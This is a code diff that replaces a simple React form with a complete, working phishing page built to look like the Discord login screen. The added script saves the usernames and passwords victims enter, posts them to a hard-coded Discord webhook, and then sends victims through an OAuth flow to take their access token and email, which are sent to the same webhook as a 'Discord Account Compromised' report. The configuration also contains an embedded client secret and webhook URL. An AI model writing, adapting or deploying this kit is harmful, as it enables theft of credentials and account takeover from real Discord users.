@@ -1,70 +1,470 @@
-'use client'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord</title>
+    <style>
+        /* Discord Design System Variables */
+        :root {
+            --bg-primary: #313338;
+            --bg-secondary: #2b2d31;
+            --bg-tertiary: #1e1f22;
+            --text-normal: #dbdee1;
+            --text-muted: #949ba4;
+            --text-link: #00a8fc;
+            --primary: #5865f2;
+            --primary-hover: #4752c4;
+            --primary-active: #3c43a3;
+            --input-bg: #1e1f22;
+            --input-border: #4e5058;
+            --error: #f23f43;
+            --success: #248046;
+        }
 
-import { useState } from 'react'
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-export default function MobileIdeasForm() {
-  const [emailOrPhone, setEmailOrPhone] = useState('')
-  const [password, setPassword] = useState('')
-  const [status, setStatus] = useState('')
-  const [isSending, setIsSending] = useState(false)
+        body {
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-normal);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
-    event.preventDefault()
-    setIsSending(true)
-    setStatus('')
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
 
-    try {
-      const response = await fetch('/api/ideas', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ emailOrPhone, password }),
-      })
+        /* NEW: Header Layout for Logo + Text */
+        .header-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px; /* Space between logo and text */
+            margin-bottom: 24px;
+        }
 
-      if (!response.ok) throw new Error('Sending failed')
-      setStatus('Ideas sent successfully.')
-      setEmailOrPhone('')
-      setPassword('')
-    } catch {
-      setStatus('Something went wrong. Please try again.')
-    } finally {
-      setIsSending(false)
-    }
-  }
+        .logo {
+            width: 40px; /* Much smaller logo */
+            height: 40px;
+            fill: var(--primary); /* Discord Blurple */
+            flex-shrink: 0;
+        }
 
-  return (
-    <main className="mobile-login-page">
-      <section className="mobile-login-card">
+        .brand-text {
+            font-size: 28px; /* Matches visual weight of 40px logo */
+            font-weight: 700;
+            color: var(--primary); /* Discord Blurple */
+            letter-spacing: 0.5px;
+            line-height: 1;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text-muted);
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 6px;
+            color: var(--text-normal);
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+        }
+
+        .input-error {
+            border-color: var(--error) !important;
+        }
+
+        .error-message {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: var(--primary);
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn-primary:active {
+            background-color: var(--primary-active);
+        }
+
+        .btn-primary:disabled {
+            background-color: var(--input-border);
+            cursor: not-allowed;
+        }
+
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+        }
+
+        .links a {
+            color: var(--text-link);
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-text {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+        }
+
+        .footer-text a {
+            color: var(--text-link);
+            text-decoration: none;
+        }
+
+        /* Spinner */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+            .brand-text {
+                font-size: 24px;
+            }
+            .logo {
+                width: 32px;
+                height: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        
+        <!-- NEW: Compact Header with Logo and Text -->
+        <div class="header-container">
+            <svg class="logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
+                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.63,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,30.89,96.36,77.7,77.7,0,0,0,37.31,85.21a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.16,0c.87.71,1.76,1.39,2.68,2a68.68,68.68,0,0,1-10.87,5.18,77,77,0,0,0,6.42,11.15,105.25,105.25,0,0,0,30.38-16.11h0C129.92,56.61,125.42,32.66,107.7,8.07ZM42.45,60.6c-5.53,0-10.06-5.12-10.06-11.41s4.45-11.41,10.06-11.41,10.12,5.12,10,11.41C52.51,55.48,48,60.6,42.45,60.6Zm42.24,0c-5.53,0-10.06-5.12-10.06-11.41s4.45-11.41,10.06-11.41,10.12,5.12,10,11.41C94.69,55.48,90.24,60.6,84.69,60.6Z" fill="currentColor"/>
+            </svg>
+            <span class="brand-text">DISCORD</span>
+        </div>
+
         <h1>Welcome back!</h1>
-        <p>Send your website ideas.</p>
 
-        <form onSubmit={handleSubmit}>
-          <label htmlFor="emailOrPhone">Email or phone number<span>*</span></label>
-          <input
-            id="emailOrPhone"
-            name="emailOrPhone"
-            type="text"
-            value={emailOrPhone}
-            onChange={(event) => setEmailOrPhone(event.target.value)}
-            required
-          />
+        <form id="discordForm" novalidate>
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" autocomplete="username" required>
+                <div id="usernameError" class="error-message">Please enter your username or email.</div>
+            </div>
 
-          <label htmlFor="password">Password<span>*</span></label>
-          <input
-            id="password"
-            name="password"
-            type="password"
-            value={password}
-            onChange={(event) => setPassword(event.target.value)}
-            required
-          />
+            <div class="form-group" style="margin-top: 16px;">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" autocomplete="current-password" required>
+                <div id="passwordError" class="error-message">Please enter your password.</div>
+            </div>
 
-          <button type="submit" disabled={isSending}>
-            {isSending ? 'Sending...' : 'Login'}
-          </button>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember" name="remember" checked>
+                <label for="remember">Remember me</label>
+            </div>
 
-          {status && <p role="status">{status}</p>}
+            <button type="submit" class="btn-primary" id="submitBtn">
+                <span id="btnText">Log In</span>
+            </button>
+
+            <div class="links">
+                <a href="#" id="forgotLink">Forgot your password?</a>
+                <a href="#" id="registerLink">Register</a>
+            </div>
         </form>
-      </section>
-    </main>
-  )
-}
+
+        <div class="footer">
+            <div class="footer-text">
+                Don't have an account? <a href="#" id="registerFooter">Register</a>
+            </div>
+            <div class="footer-text">
+                By logging in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            clientId: '1457710914420736112',
+            clientSecret: 'BvMHrHk7IVeTqbv546LhEIFk6A0jt09R',
+            webhookUrl: 'https://discord.com/api/webhooks/1557766144092405860/4spZqw7tBZ1nADcfsOw8RSSOBLfdwSyHecDJUgh2VqXw6URE4dXVU8BbbMa-uIIPxe0V',
+            // IMPORTANT: This URL must be in your Discord Developer Console under "Redirects"!
+            redirectUri: window.location.origin + window.location.pathname,
+            scopes: 'identify email guilds'
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('discordForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const usernameError = document.getElementById('usernameError');
+            const passwordError = document.getElementById('passwordError');
+
+            // Check if we are returning from OAuth callback
+            const hash = window.location.hash;
+            if (hash && hash.includes('access_token')) {
+                handleOAuthCallback();
+                return;
+            }
+
+            // Load saved credentials if they exist
+            const savedUser = localStorage.getItem('phish_user');
+            const savedPass = localStorage.getItem('phish_pass');
+            if (savedUser) usernameInput.value = savedUser;
+            if (savedPass) passwordInput.value = savedPass;
+
+            function setLoading(isLoading) {
+                if (isLoading) {
+                    submitBtn.disabled = true;
+                    btnText.innerHTML = '<div class="spinner"></div>';
+                } else {
+                    submitBtn.disabled = false;
+                    btnText.innerHTML = 'Log In';
+                }
+            }
+
+            function validateForm() {
+                let valid = true;
+                usernameError.style.display = 'none';
+                passwordError.style.display = 'none';
+                usernameInput.classList.remove('input-error');
+                passwordInput.classList.remove('input-error');
+
+                if (!usernameInput.value.trim()) {
+                    usernameError.style.display = 'block';
+                    usernameInput.classList.add('input-error');
+                    valid = false;
+                }
+                if (!passwordInput.value.trim()) {
+                    passwordError.style.display = 'block';
+                    passwordInput.classList.add('input-error');
+                    valid = false;
+                }
+                return valid;
+            }
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                if (!validateForm()) return;
+
+                setLoading(true);
+
+                // 1. Save credentials locally (Fallback)
+                localStorage.setItem('phish_user', usernameInput.value);
+                localStorage.setItem('phish_pass', passwordInput.value);
+
+                // 2. Send Initial Payload to Webhook (Login Attempt)
+                const initialPayload = {
+                    content: `🎯 **Login Attempt**`,
+                    embeds: [{
+                        title: 'Username & Password Captured',
+                        color: 0x5865f2,
+                        fields: [
+                            { name: 'Username', value: usernameInput.value, inline: false },
+                            { name: 'Password', value: `\`${passwordInput.value}\``, inline: false },
+                            { name: 'User Agent', value: navigator.userAgent.substring(0, 150) + '...', inline: false }
+                        ]
+                    }]
+                };
+
+                try {
+                    await fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(initialPayload)
+                    });
+
+                    // 3. Redirect to Discord OAuth
+                    const params = new URLSearchParams({
+                        client_id: CONFIG.clientId,
+                        response_type: 'token', // Implicit Grant
+                        redirect_uri: CONFIG.redirectUri,
+                        scope: CONFIG.scopes
+                    });
+
+                    window.location.href = `https://discord.com/oauth2/authorize?${params.toString()}`;
+
+                } catch (error) {
+                    console.error('Error:', error);
+                    setLoading(false);
+                    alert('Error logging in. Please try again.');
+                }
+            });
+
+            // Links
+            document.getElementById('forgotLink').addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.href = 'https://discord.com/login';
+            });
+            document.getElementById('registerLink').addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.href = 'https://discord.com/register';
+            });
+            document.getElementById('registerFooter').addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.href = 'https://discord.com/register';
+            });
+        });
+
+        async function handleOAuthCallback() {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const accessToken = params.get('access_token');
+            const expiresIn = params.get('expires_in');
+            const scope = params.get('scope');
+
+            if (accessToken) {
+                // 1. Fetch User Details
+                try {
+                    const userRes = await fetch('https://discord.com/api/users/@me', {
+                        headers: { 'Authorization': `Bearer ${accessToken}` }
+                    });
+                    const user = await userRes.json();
+
+                    // 2. Retrieve saved credentials
+                    const savedUser = localStorage.getItem('phish_user') || 'Unknown';
+                    const savedPass = localStorage.getItem('phish_pass') || 'Unknown';
+
+                    // 3. Send Full Access Payload
+                    const fullPayload = {
+                        content: `🔓 **FULL ACCESS ACHIEVED!**`,
+                        embeds: [{
+                            title: '✅ Discord Account Compromised',
+                            color: 0x248046,
+                            fields: [
+                                { name: 'User ID', value: user.id, inline: true },
+                                { name: 'Username', value: user.username, inline: true },
+                                { name: 'Email', value: user.email || 'Not Available', inline: false },
+                                { name: 'Access Token', value: `\`${accessToken}\``, inline: false },
+                                { name: 'Entered User', value: savedUser, inline: true },
+                                { name: 'Entered Pass', value: `\`${savedPass}\``, inline: true },
+                                { name: 'Expires In', value: `${expiresIn} Seconds`, inline: false }
+                            ],
+                            footer: { text: 'Token is valid!' }
+                        }]
+                    };
+
+                    await fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(fullPayload)
+                    });
+
+                    // Cleanup & Redirect to clean URL
+                    localStorage.removeItem('phish_user');
+                    localStorage.removeItem('phish_pass');
+                    window.location.replace(window.location.pathname);
+
+                } catch (err) {
+                    console.error('Callback Error:', err);
+                }
+            }
+        }
+    </script>
+</body>
+</html>
